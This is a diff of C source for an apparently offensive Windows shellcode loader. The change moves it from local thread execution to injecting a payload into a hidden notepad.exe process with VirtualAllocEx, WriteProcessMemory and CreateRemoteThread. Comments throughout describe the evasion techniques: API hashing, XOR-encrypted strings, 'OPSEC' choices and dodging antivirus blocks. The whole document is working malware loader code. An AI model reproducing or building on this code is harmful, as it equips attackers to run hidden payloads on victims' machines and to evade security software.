@@ -4,52 +4,104 @@
 #include <stdio.h>
 
 // used to cast generic API function pointer (FARPROC)
-typedef BOOL (WINAPI *pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
+typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
+typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
+typedef BOOL (WINAPI *pVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
+typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 
 bool execute_payload(char* payload_buffer, SIZE_T payload_size) {
-
+    // load key runtime (in stack)
+    LOAD_GLOBAL_KEY(cypher_key, cypher_key_len);
+    
     char enc_kernel32[] = { /* kernel32.dll\0 */ };
-    char enc_VirtProtect[] = { /* VirtualProtect\0 */ };
-    char enc_CreateThrd[] = { /* CreateThread\0 */ };
-    char enc_WaitSingle[] = { /* WaitForSingleObject\0 */ };
+    char enc_target_process[] = { /* C:\\Windows\\System32\\notepad.exe\0 */ };
 
-    // --- dynamic resolution
+    // API hashes
+    // NOTE: calculate these using hasher.py
+    DWORD hash_CreateProc = 0xAEB52E19;     // djb2 for "CreateProcessA"
+    DWORD hash_VirtAllocEx = 0xF36E5AB4;    // djb2 for "VirtualAllocEx"
+    DWORD hash_WriteProcMem = 0x6F22E8C8;   // djb2 for "WriteProcessMemory"
+    DWORD hash_VirtProtEx = 0xD812922A;     // djb2 for "VirtualProtectEx"
+    DWORD hash_CreateRemThrd = 0xAA30775D;  // djb2 for "CreateRemoteThread"
 
-    pVirtualProtect fnVirtualProtect = (pVirtualProtect) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_VirtProtect, sizeof(enc_VirtProtect), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pCreateThread fnCreateThread = (pCreateThread) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_CreateThrd, sizeof(enc_CreateThrd), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    pWaitForSingleObject fnWaitForSingleObject = (pWaitForSingleObject) resolve_api(enc_kernel32, sizeof(enc_kernel32), enc_WaitSingle, sizeof(enc_WaitSingle), GLOBAL_KEY, GLOBAL_KEY_LEN);
-    
+    // --- load DLL dynamically
+
+    // kernel32.dll
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
+    HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
+    // OPSEC: recypher DLL name immediately
+    xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len); 
+
+    if (!hKernel32) return false;
+
+    // --- dynamic resolution via hashing
+
+    pCreateProcessA fnCreateProcessA = (pCreateProcessA) get_api_by_hash(hKernel32, hash_CreateProc);
+    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx) get_api_by_hash(hKernel32, hash_VirtAllocEx);
+    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory) get_api_by_hash(hKernel32, hash_WriteProcMem);
+    pVirtualProtectEx fnVirtualProtectEx = (pVirtualProtectEx) get_api_by_hash(hKernel32, hash_VirtProtEx);
+    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread) get_api_by_hash(hKernel32, hash_CreateRemThrd);
+
     // if AV blocks a function -> return
-    if (!fnVirtualProtect || !fnCreateThread || !fnWaitForSingleObject) return false;
+    if (!fnCreateProcessA || !fnVirtualAllocEx || !fnWriteProcessMemory || !fnVirtualProtectEx || !fnCreateRemoteThread) return false;
 
-    // --- prepare memory (DEP bypass del DEP)
+    // --- setup target process (notepad.exe)
 
-    DWORD oldProtect = 0;
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
     
-    // change buffer permission: from PAGE_READWRITE to PAGE_EXECUTE_READ
-    bool protect_success = fnVirtualProtect(payload_buffer, payload_size, PAGE_EXECUTE_READ, &oldProtect);
+    xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
     
-    // if AV blocks permission change -> return
-    if (!protect_success) {
+    // NOTE: use CREATE_NO_WINDOW flag to not show GUI
+    bool proc_created = fnCreateProcessA(NULL, enc_target_process, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    
+    // OPSEC: recypher
+    xor_crypt(enc_target_process, sizeof(enc_target_process), cypher_key, cypher_key_len);
+
+    if (!proc_created) return false;
+
+    // --- prepare memory (DEP bypass)
+
+    // NOTE: using PAGE_READWRITE flag -> better OPSEC than PAGE_EXECUTE_READWRITE
+    LPVOID remote_buffer = fnVirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    
+    if (!remote_buffer) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
         return false;
     }
 
-    // --- execute
-    
-    HANDLE hThread = NULL;
-    DWORD threadId = 0;
+    // --- write shellcode
 
-    // create a new thread inside current process (Local Injection)
-    hThread = fnCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload_buffer, NULL, 0, &threadId);
-
-    if (hThread == NULL) {
-        return false; // execution failed
+    SIZE_T bytes_written;
+    if (!fnWriteProcessMemory(pi.hProcess, remote_buffer, payload_buffer, payload_size, &bytes_written)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return false;
     }
 
-    // freeze current process
-    fnWaitForSingleObject(hThread, INFINITE);
+    // change permissions to execute (DEP bypass)
+    DWORD oldProtect = 0;
+    if (!fnVirtualProtectEx(pi.hProcess, remote_buffer, payload_size, PAGE_EXECUTE_READ, &oldProtect)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return false;
+    }
+
+    // create remote thread and stard
+    HANDLE hRemoteThread = fnCreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remote_buffer, NULL, 0, NULL);
+    
+    if (!hRemoteThread) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return false;
+    }
+
+    // clean handlers
+    CloseHandle(hRemoteThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 
     return true;
 }
